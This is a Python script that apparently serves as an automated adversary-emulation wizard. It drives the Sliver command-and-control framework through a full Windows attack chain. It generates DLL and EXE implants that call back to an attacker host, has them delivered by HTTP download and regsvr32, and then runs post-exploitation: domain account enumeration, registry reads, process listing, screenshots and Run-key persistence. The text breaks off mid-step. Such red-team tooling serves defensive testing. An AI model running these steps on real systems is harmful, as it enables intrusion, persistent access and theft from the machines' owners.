
import asyncio
import time
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
_execution_timestamps = []
def log_command_execution():
    ts = time.time_ns()
    _execution_timestamps.append(ts)
    console.print(f"[bold yellow][Command execution at] " + str(ts) + "[/]")
    console.print(f"[bold yellow][All timestamps] " + str(_execution_timestamps) + "[/]")
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")

    pddl_parameters = {}

    # Dictionary to track executors and their relationships
    # Each executor has: type, isDerivedExecutor, RealSessionID, parentExecutor
    executor_dict = {}

    console.print(f"[bold cyan]\n📌[Sliver Console] Step 1[/]")
    console.print(f"[bold cyan]\n📌[Name] Build DLL Sliver implant[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")

    if "string0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string0"]))
        user_params["SAVE_PATH"] = pddl_parameters["string0"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string0"] = user_input

    # Execute in Sliver Console
    console.print(f"[bold green][MANUAL ACTION REQUIRED][/bold green]")
    console.print(f"""\
    sliver > generate --mtls {user_params["LHOST"]}:{user_params["LPORT"]} --os windows --arch 64bit --format shared --save {user_params["SAVE_PATH"]}
    sliver > mtls --lport {user_params["LPORT"]}

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[Human] Step 2[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download a file on its machine[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")

    default_val = 8000
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")

    if "string4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4"]))
        user_params["SAVE_PATH"] = pddl_parameters["string4"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string4"] = user_input

    # Map PATH to already collected SAVE_PATH
    user_params["PATH"] = user_params["SAVE_PATH"]
    console.print(f"""\
    (This step needs human interaction and (temporarily) cannot be executed automatically)
    (On attacker's machine)
    python -m http.server {user_params["LPORT"]}

    (On victim's machine)
    1. Open {user_params["LHOST"]}:{user_params["LPORT"]} in the browser
    2. Navigate to the path of the file on the attacker's machine
    3. Download the file to {user_params["PATH"]}

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[Human] Step 3[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim execute a DLL file on its machine[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: DLL_PATH[/]")
    console.print(f"  Description: Saved path of the DLL file")

    if "string4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string4"]))
        user_params["DLL_PATH"] = pddl_parameters["string4"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for DLL_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: DLL_PATH")
        user_params["DLL_PATH"] = user_input
        pddl_parameters["string4"] = user_input
    console.print(f"""\
    (This step needs human interaction and (temporarily) cannot be executed automatically)
    (On victim's machine, use PowerShell or Command Prompt)
    regsvr32 {user_params["DLL_PATH"]}

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[None] Step 4[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute a Sliver Implant Payload[/]")


    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 5[/]")
    console.print(f"[bold cyan]\n📌[Name] User Context Verification[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Sliver sessions:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        executor_dict["executor0"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: whoami[/]")
    confirm_action()
    log_command_execution()
    try:
        await sliver_executor.whoami(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6[/]")
    console.print(f"[bold cyan]\n📌[Name] Environment Variable Retrieval[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Sliver sessions:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        executor_dict["executor0"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: name[/]")
    console.print(f"  Description: Environment variable name to query")

    default_val = ''
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for name (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: name")
    user_params["name"] = user_input

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: get_env[/]")
    confirm_action()
    log_command_execution()
    try:
        await sliver_executor.get_env(str(user_params["name"]), str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 7[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute Command (cmd.exe)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ParentExecutorID[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["ParentExecutorID"] = pddl_parameters["executor0"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select parent session for derived executor:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["ParentExecutorID"] = selected_session
        pddl_parameters["executor0"] = selected_session
        # Register in executor_dict as a parent Sliver executor
        executor_dict["executor0"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # DerivedExecutorID (executor2): Derived executor - implicit in the command execution
    # Description: The dervied Windows CMD executor.
    # Register as derived executor with parent: executor0
    # Get parent's session ID for the derived executor
    if "executor0" != "None" and "executor0" in executor_dict:
        parent_session_id = executor_dict["executor0"]["RealSessionID"]
        pddl_parameters["executor2"] = parent_session_id
    else:
        parent_session_id = user_params.get("SessionID", user_params.get("meterpreter_sessionid", ""))
        pddl_parameters["executor2"] = parent_session_id

    executor_dict["executor2"] = {
        "type": None,  # Type determined by command execution
        "isDerivedExecutor": True,
        "RealSessionID": parent_session_id,  # Use parent's session ID
        "parentExecutor": "executor0" if "executor0" != "None" else None
    }

    console.print(f"[bold cyan]\n📌[Command Prompt Executor] Step 8[/]")
    console.print(f"[bold cyan]\n📌[Name] Enumerate all accounts (Domain)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The executor for this action")

    if "executor2" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor2"]))
        user_params["Executor"] = pddl_parameters["executor2"]
    else:
        default_val = ''
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for Executor (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: Executor")
        user_params["Executor"] = user_input
        pddl_parameters["executor2"] = user_input

    confirm_action()
    commands = f"""
    net user /domain
    net group /domain
    """
    log_command_execution()
    await sliver_executor.cmd(session_id=executor_dict["executor2"]["RealSessionID"],input_commands=commands)

    print_finished_message()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 9[/]")
    console.print(f"[bold cyan]\n📌[Name] Network Interface Discovery[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Sliver sessions:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        executor_dict["executor0"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: ifconfig[/]")
    confirm_action()
    log_command_execution()
    try:
        await sliver_executor.ifconfig(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 10[/]")
    console.print(f"[bold cyan]\n📌[Name] Registry Key Read Operation[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Sliver sessions:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        executor_dict["executor0"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: hive[/]")
    console.print(f"  Description: Registry hive (HKLM/HKCU/HKU)")

    default_val = ''
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for hive (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: hive")
    user_params["hive"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: reg_path[/]")
    console.print(f"  Description: Path to registry key")

    default_val = ''
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for reg_path (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: reg_path")
    user_params["reg_path"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: key[/]")
    console.print(f"  Description: Specific value name to read")

    default_val = ''
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for key (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: key")
    user_params["key"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: hostname[/]")
    console.print(f"  Description: Target hostname for remote registry access")

    default_val = ''
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for hostname (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: hostname")
    user_params["hostname"] = user_input

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: registry_read[/]")
    confirm_action()
    log_command_execution()
    try:
        await sliver_executor.registry_read(str(user_params["hive"]), str(user_params["reg_path"]), str(user_params["key"]), str(user_params["hostname"]), str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 11[/]")
    console.print(f"[bold cyan]\n📌[Name] Get Current Working Directory[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Sliver sessions:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        executor_dict["executor0"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: pwd[/]")
    confirm_action()
    log_command_execution()
    try:
        await sliver_executor.pwd(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 12[/]")
    console.print(f"[bold cyan]\n📌[Name] Remote Processes List[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Sliver sessions:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        executor_dict["executor0"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: ps[/]")
    confirm_action()
    log_command_execution()
    try:
        await sliver_executor.ps(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Console] Step 13[/]")
    console.print(f"[bold cyan]\n📌[Name] Build the executable file of a Sliver implant (for Windows)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")

    if "string3" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string3"]))
        user_params["SAVE_PATH"] = pddl_parameters["string3"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string3"] = user_input

    # Execute in Sliver Console
    console.print(f"[bold green][MANUAL ACTION REQUIRED][/bold green]")
    console.print(f"""\
    sliver > generate --mtls {user_params["LHOST"]}:{user_params["LPORT"]} --os windows --arch 64bit --format exe --save {user_params["SAVE_PATH"]}
    sliver > mtls --lport {user_params["LPORT"]}

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[Human] Step 14[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download a file on its machine[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")

    default_val = None
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")

    default_val = 8000
    required_val = True
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")

    if "string2" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string2"]))
        user_params["SAVE_PATH"] = pddl_parameters["string2"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string2"] = user_input

    # Map PATH to already collected SAVE_PATH
    user_params["PATH"] = user_params["SAVE_PATH"]
    console.print(f"""\
    (This step needs human interaction and (temporarily) cannot be executed automatically)
    (On attacker's machine)
    python -m http.server {user_params["LPORT"]}

    (On victim's machine)
    1. Open {user_params["LHOST"]}:{user_params["LPORT"]} in the browser
    2. Navigate to the path of the file on the attacker's machine
    3. Download the file to {user_params["PATH"]}

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[Command Prompt Executor] Step 15[/]")
    console.print(f"[bold cyan]\n📌[Name] Reg Key Run[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The executor for this action")

    if "executor2" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor2"]))
        user_params["Executor"] = pddl_parameters["executor2"]
    else:
        default_val = ''
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for Executor (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: Executor")
        user_params["Executor"] = user_input
        pddl_parameters["executor2"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: command_to_execute[/]")
    console.print(f"  Description: Thing to Run")

    if "string2" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string2"]))
        user_params["command_to_execute"] = pddl_parameters["string2"]
    else:
        default_val = 'C:\\Path\\AtomicRedTeam.exe'
        required_val = False
        user_input = console.input(
            f"[bold]➤ Enter value for command_to_execute (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and False:
            raise ValueError("Missing required parameter: command_to_execute")
        user_params["command_to_execute"] = user_input
        pddl_parameters["string2"] = user_input

    confirm_action()
    commands = f"""
    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "{user_params["command_to_execute"]}"
    """
    log_command_execution()
    await sliver_executor.cmd(session_id=executor_dict["executor2"]["RealSessionID"],input_commands=commands)

    print_finished_message()

    console.print(f"[bold cyan]\n📌[None] Step 16[/]")
    console.print(f"[bold cyan]\n📌[Name] Obtain a persistent Sliver Executor[/]")


    console.print(f"[bold cyan]\n📌[Human] Step 17[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download and execute malicious payload file as Admin (Root)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: HOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")

    default_val = None
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for HOST (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: HOST")
    user_params["HOST"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")

    default_val = 8000
    required_val = False
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")

    if "string1" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string1"]))
        user_params["SAVE_PATH"] = pddl_parameters["string1"]
    else:
        default_val = None
        required_val = True
        user_input = console.input(
            f"[bold]➤ Enter value for SAVE_PATH (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: SAVE_PATH")
        user_params["SAVE_PATH"] = user_input
        pddl_parameters["string1"] = user_input

    # Map LHOST to already collected HOST
    user_params["LHOST"] = user_params["HOST"]
    console.print(f"""\
    (This step needs human interaction and (temporarily) cannot be executed automatically)
    (On attacker's machine)
    python -m http.server {user_params["LPORT"]}

    (On victim's machine)
    1. Open {user_params["LHOST"]}:{user_params["LPORT"]} in the browser
    2. Navigate to the path of the target payload file
    3. Download the payload file
    4. Execute the payload file to {user_params["SAVE_PATH"]} as Admin (Root)

    """)

    confirm_action()

    console.print(f"[bold cyan]\n📌[None] Step 18[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute a Sliver Implant Payload[/]")


    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 19[/]")
    console.print(f"[bold cyan]\n📌[Name] Take Screenshot[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor0" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0"]))
        user_params["Executor"] = pddl_parameters["executor0"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select from available Sliver sessions:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["Executor"] = selected_session
        pddl_parameters["executor0"] = selected_session
        executor_dict["executor0"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: screenshot[/]")
    confirm_action()
    log_command_execution()
    try:
        await sliver_executor.screenshot(str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 20[/]")
    console.print(f"[bold cyan]\n📌[Name] Execute Command (cmd.exe)[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ParentExecutorID[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")

    if "executor3" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor3"]))
        user_params["ParentExecutorID"] = pddl_parameters["executor3"]
    else:
        # Initialize Sliver executor if not already done
        if 'sliver_executor' not in dir():
            from attack_executor.post_exploit.Sliver import SliverExecutor
            sliver_executor = SliverExecutor(config=config)

        console.print(f"[bold cyan]  Select parent session for derived executor:[/]")
        selected_session = await sliver_executor.select_sessions()
        user_params["ParentExecutorID"] = selected_session
        pddl_parameters["executor3"] = selected_session
        # Register in executor_dict as a parent Sliver executor
        executor_dict["executor3"] = {
            "type": "Sliver Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }

    # DerivedExecutorID (executor4): Derived executor - implicit in the command execution
    # Description: The dervied Windows CMD executor.
    # Register as derived executor with parent: executor3
    # Get parent's session ID for the derived executor
    if "executor3" != "None" and "executor3" in executor_dict:
        parent_session_id = executor_dict["executor3"]["RealSessionID"]
        pddl_parameters["executor4"] = parent_session_id
    else:
        parent_session_id = user_params.get("SessionID", user_params.get("meterpreter_sessionid", ""))
        pddl_parameters["executor4"] = parent_session_id

    executor_dict["executor4"] = {
        "type": None,  # Type determined by command execution
        "isDerivedExecutor": True,
        "RealSessionID": parent_session_id,  # Use parent's session ID
        "parentExecutor": "executor3" if "executor3" != "None" else None
    }

    console.print(f"[bold cyan]\n📌[Elevated Command Prompt Executor] Step 21[/]")
    console.print(f"[bold cyan]\n📌[Name] Logoff System - Windows[/]")

    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Executor[/]")
    console.print(f"  Description: The executor for this action")

    if "executor4" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor4"]))
        user_params["Executor"] = pddl_parameters["executor4"]
    else:
        default_val = ''
        required_val = True
        user_input = console.input(
